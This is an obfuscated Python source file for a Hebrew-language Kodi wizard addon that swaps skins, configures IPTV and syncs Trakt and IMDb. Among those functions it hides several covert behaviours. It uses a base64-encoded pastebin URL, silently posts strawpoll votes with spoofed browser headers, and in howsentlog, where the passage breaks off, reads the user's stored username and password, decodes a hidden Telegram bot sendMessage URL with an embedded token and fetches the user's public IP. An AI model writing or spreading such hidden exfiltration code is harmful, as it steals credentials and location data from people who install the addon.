# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OOOOOO0O0OOO0OO00 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OO000OOOO00OO0OOO =[];O000OOO0OOO00OO0O =[]#line:267
	for O0O00O00OOO0OO000 in sorted (OOOOOO0O0OOO0OO00 ,key =lambda OO0OO0OO0O0O0OO00 :OO0OO0OO0O0O0OO00 ):#line:268
		OO0OOOOOOOOOO00O0 =os .path .split (O0O00O00OOO0OO000 [:-1 ])[1 ]#line:269
		O0OOO00O0000OO000 =os .path .join (O0O00O00OOO0OO000 ,'addon.xml')#line:270
		if os .path .exists (O0OOO00O0000OO000 ):#line:271
			OOO00O000OOOO000O =open (O0OOO00O0000OO000 )#line:272
			OOOO00OOO000O0000 =OOO00O000OOOO000O .read ()#line:273
			O0O0OOOO00OO000O0 =parseDOM2 (OOOO00OOO000O0000 ,'addon',ret ='id')#line:274
			OO0O00OO000O00O0O =OO0OOOOOOOOOO00O0 if len (O0O0OOOO00OO000O0 )==0 else O0O0OOOO00OO000O0 [0 ]#line:275
			try :#line:276
				OO0O0OO00O00O0O0O =xbmcaddon .Addon (id =OO0O00OO000O00O0O )#line:277
				OO000OOOO00OO0OOO .append (OO0O0OO00O00O0O0O .getAddonInfo ('name'))#line:278
				O000OOO0OOO00OO0O .append (OO0O00OO000O00O0O )#line:279
			except :#line:280
				pass #line:281
	OOO00O0OO0OOO0OOO =[];OOOO0OOOO00O00000 =0 #line:282
	OO0O00O0OO000O0OO =["Current Skin -- %s"%currSkin ()]+OO000OOOO00OO0OOO #line:283
	OOOO0OOOO00O00000 =DIALOG .select ("Select the Skin you want to swap with.",OO0O00O0OO000O0OO )#line:284
	if OOOO0OOOO00O00000 ==-1 :return #line:285
	else :#line:286
		O0OOO0000000O0O00 =(OOOO0OOOO00O00000 -1 )#line:287
		OOO00O0OO0OOO0OOO .append (O0OOO0000000O0O00 )#line:288
		OO0O00O0OO000O0OO [OOOO0OOOO00O00000 ]="%s"%(OO000OOOO00OO0OOO [O0OOO0000000O0O00 ])#line:289
	if OOO00O0OO0OOO0OOO ==None :return #line:290
	for O00OOOO00OOOOO0OO in OOO00O0OO0OOO0OOO :#line:291
		swapSkins (O000OOO0OOO00OO0O [O00OOOO00OOOOO0OO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0OO0OO00OOOO0OO0 ,title ="Error"):#line:296
	O00O00O0OO00O000O ='lookandfeel.skin'#line:297
	O000OO0OO0OOOO00O =O0OO0OO00OOOO0OO0 #line:298
	O000O000OOOO0O00O =getOld (O00O00O0OO00O000O )#line:299
	OO0O0OO0000O0O00O =O00O00O0OO00O000O #line:300
	setNew (OO0O0OO0000O0O00O ,O000OO0OO0OOOO00O )#line:301
	OOOO000000OOO00O0 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO000000OOO00O0 <100 :#line:303
		OOOO000000OOO00O0 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OOO00O000O000O000 ):#line:310
	try :#line:311
		OOO00O000O000O000 ='"%s"'%OOO00O000O000O000 #line:312
		O00OOO0OOO0O00OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO00O000O000O000 )#line:313
		OO0O0000OO000O00O =xbmc .executeJSONRPC (O00OOO0OOO0O00OOO )#line:315
		OO0O0000OO000O00O =simplejson .loads (OO0O0000OO000O00O )#line:316
		if OO0O0000OO000O00O .has_key ('result'):#line:317
			if OO0O0000OO000O00O ['result'].has_key ('value'):#line:318
				return OO0O0000OO000O00O ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OO000OOOO000OO0OO ,OO0O0O000OOOOO0O0 ):#line:325
	try :#line:326
		OO000OOOO000OO0OO ='"%s"'%OO000OOOO000OO0OO #line:327
		OO0O0O000OOOOO0O0 ='"%s"'%OO0O0O000OOOOO0O0 #line:328
		OOOOO0O00O0OO0O0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO000OOOO000OO0OO ,OO0O0O000OOOOO0O0 )#line:329
		OO0O0OOOO000000OO =xbmc .executeJSONRPC (OOOOO0O00O0OO0O0O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O0OO000O00000OOOO =xbmcgui .DialogProgress ()#line:340
			O0OO000O00000OOOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O0OO000O00000OOOO .update (0 )#line:344
			for O00OO00O0OOOO000O in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O0OO000O00000OOOO .update (int ((5 -O00OO00O0OOOO000O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O00OO00O0OOOO000O ),'')#line:347
				if O0OO000O00000OOOO .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O0OO000O00000OOOO =xbmcgui .DialogProgress ()#line:353
			O0OO000O00000OOOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O0OO000O00000OOOO .update (0 )#line:357
			for O00OO00O0OOOO000O in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O0OO000O00000OOOO .update (int ((5 -O00OO00O0OOOO000O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O00OO00O0OOOO000O ),'')#line:360
				if O0OO000O00000OOOO .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0O0O00OO0OO00O0O ='18773068'#line:373
    O00O000OOOOOOO000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O00OO0OO00O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O00OO0OOO0O0OOOOO ='145273320'#line:387
    O000OOO0O00OO0OOO ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O0O0O0O000O0OOOO0 =O00OO0OOO0O0OOOOO #line:390
    else :#line:391
        O0O0O0O000O0OOOO0 =O000OOO0O00OO0OOO #line:392
    OOO0OOO0OO0O0OOO0 ={'options':O0O0O0O000O0OOOO0 }#line:396
    OO00OOO0O0000O0OO =requests .post ('https://www.strawpoll.me/'+O0O0O00OO0OO00O0O ,headers =O00O000OOOOOOO000 ,data =OOO0OOO0OO0O0OOO0 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OO0OOOO0OO0O0OO0O ='18773068'#line:402
        OOO0O0O0000OO00O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OOOO0OO0O0OO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O000OO00O0O000O00 ='145273320'#line:416
        O00OOOOOO0OO0000O ={'options':O000OO00O0O000O00 }#line:422
        O0OO00OO0O0000O00 =requests .post ('https://www.strawpoll.me/'+OO0OOOO0OO0O0OO0O ,headers =OOO0O0O0000OO00O0 ,data =O00OOOOOO0OO0000O )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        OO0O0OO0OOO000O00 ='18773068'#line:429
        O0O00000O000O000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O0OO0OOO000O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OO00OO0O0O00OOOO0 ='145273321'#line:443
        O000O0OOO00O0OOOO ={'options':OO00OO0O0O00OOOO0 }#line:449
        OO000O0O00OOOO000 =requests .post ('https://www.strawpoll.me/'+OO0O0OO0OOO000O00 ,headers =O0O00000O000O000O ,data =O000O0OOO00O0OOOO )#line:451
   except :pass #line:452
def testcommand ():#line:456
	infobuild ()#line:457
def skin_homeselect ():#line:458
	try :#line:460
		OO0OO0O0OOOO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:461
		OOOOOOO0OOOOO0OOO =open (OO0OO0O0OOOO0OO0O ,'r')#line:463
		OO00O00O0O0O0O0OO =OOOOOOO0OOOOO0OOO .read ()#line:464
		OOOOOOO0OOOOO0OOO .close ()#line:465
		O0O00O0O00OOOO00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:466
		OOO00O0OOO0OO000O =re .compile (O0O00O0O00OOOO00O ).findall (OO00O00O0O0O0O0OO )[0 ]#line:467
		OOOOOOO0OOOOO0OOO =open (OO0OO0O0OOOO0OO0O ,'w')#line:468
		OOOOOOO0OOOOO0OOO .write (OO00O00O0O0O0O0OO .replace ('<setting id="HomeS" type="string%s/setting>'%OOO00O0OOO0OO000O ,'<setting id="HomeS" type="string"></setting>'))#line:469
		OOOOOOO0OOOOO0OOO .close ()#line:470
	except :#line:471
		pass #line:472
def autotrakt ():#line:475
    O0OO0OOOO00OOO00O =(ADDON .getSetting ("auto_trk"))#line:476
    if O0OO0OOOO00OOO00O =='true':#line:477
       from resources .libs import trk_aut #line:478
def traktsync ():#line:480
     OOO00O0O0O0O0OOOO =(ADDON .getSetting ("auto_trk"))#line:481
     if OOO00O0O0O0O0OOOO =='true':#line:482
       from resources .libs import trk_aut #line:485
     else :#line:486
        ADDON .openSettings ()#line:487
def imdb_synck ():#line:489
   try :#line:490
     OOOOOOO000O0O000O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:491
     OO00OO0O00OO000OO =xbmcaddon .Addon ('plugin.video.gaia')#line:492
     OO00O0000O000OOO0 =(ADDON .getSetting ("imdb_sync"))#line:493
     OO0OO000O00OO0OO0 ="imdb.user"#line:494
     OOO0000OO0O0OOOOO ="accounts.informants.imdb.user"#line:495
     OOOOOOO000O0O000O .setSetting (OO0OO000O00OO0OO0 ,str (OO00O0000O000OOO0 ))#line:496
     OO00OO0O00OO000OO .setSetting ('accounts.informants.imdb.enabled','true')#line:497
     OO00OO0O00OO000OO .setSetting (OOO0000OO0O0OOOOO ,str (OO00O0000O000OOO0 ))#line:498
   except :pass #line:499
def dis_or_enable_addon (OOOOO0000OOO0OO0O ,OOOOOO0O0OOOOO000 ,enable ="true"):#line:501
    import json #line:502
    OO0O000OO0OO0OOOO ='"%s"'%OOOOO0000OOO0OO0O #line:503
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO0000OOO0OO0O )and enable =="true":#line:504
        logging .warning ('already Enabled')#line:505
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOOO0000OOO0OO0O )#line:506
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO0000OOO0OO0O )and enable =="false":#line:507
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOOO0000OOO0OO0O )#line:508
    else :#line:509
        OO00OO0OO00OO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0O000OO0OO0OOOO ,enable )#line:510
        O00OO0OO0O0OO0000 =xbmc .executeJSONRPC (OO00OO0OO00OO0O0O )#line:511
        O0OOOO0O0OO00O000 =json .loads (O00OO0OO0O0OO0000 )#line:512
        if enable =="true":#line:513
            xbmc .log ("### Enabled %s, response = %s"%(OOOOO0000OOO0OO0O ,O0OOOO0O0OO00O000 ))#line:514
        else :#line:515
            xbmc .log ("### Disabled %s, response = %s"%(OOOOO0000OOO0OO0O ,O0OOOO0O0OO00O000 ))#line:516
    if OOOOOO0O0OOOOO000 =='auto':#line:517
     return True #line:518
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:519
def iptvset ():#line:522
  try :#line:523
    O00O00O0OOO00OOO0 =(ADDON .getSetting ("iptv_on"))#line:524
    if O00O00O0OOO00OOO0 =='true':#line:526
       if KODIV >=17 and KODIV <18 :#line:528
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:529
         OOOOOO00000O00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:530
         O0OO0OO00OO00OOO0 =(ADDON .getSetting ("iptvUrl"))#line:532
         OOOOOO00000O00OO0 .setSetting ('m3uUrl',O0OO0OO00OO00OOO0 )#line:533
         O00000000O00OOOO0 =(ADDON .getSetting ("epg_Url"))#line:534
         OOOOOO00000O00OO0 .setSetting ('epgUrl',O00000000O00OOOO0 )#line:535
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:538
         iptvsimpldownpc ()#line:539
         wiz .kodi17Fix ()#line:540
         xbmc .sleep (1000 )#line:541
         OOOOOO00000O00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:542
         O0OO0OO00OO00OOO0 =(ADDON .getSetting ("iptvUrl"))#line:543
         OOOOOO00000O00OO0 .setSetting ('m3uUrl',O0OO0OO00OO00OOO0 )#line:544
         O00000000O00OOOO0 =(ADDON .getSetting ("epg_Url"))#line:545
         OOOOOO00000O00OO0 .setSetting ('epgUrl',O00000000O00OOOO0 )#line:546
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:548
         iptvsimpldown ()#line:549
         wiz .kodi17Fix ()#line:550
         xbmc .sleep (1000 )#line:551
         OOOOOO00000O00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:552
         O0OO0OO00OO00OOO0 =(ADDON .getSetting ("iptvUrl"))#line:553
         OOOOOO00000O00OO0 .setSetting ('m3uUrl',O0OO0OO00OO00OOO0 )#line:554
         O00000000O00OOOO0 =(ADDON .getSetting ("epg_Url"))#line:555
         OOOOOO00000O00OO0 .setSetting ('epgUrl',O00000000O00OOOO0 )#line:556
  except :pass #line:557
def howsentlog ():#line:564
       try :#line:565
          import json #line:566
          O0O0O0OOOO00O0O0O =(ADDON .getSetting ("user"))#line:567
          OO00O00OOOO0OO0O0 =(ADDON .getSetting ("pass"))#line:568
          O0O0OO0O0O0O0O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:569
          O00O00000OO0OOO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:571
          O0O0O0OOOO0OO0O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:572
          OOOO0O0OOO0OO000O =str (json .loads (O0O0O0OOOO0OO0O00 )['ip'])#line:573
          O0O00O00O000OO0O0 =O0O0O0OOOO00O0O0O #line:574
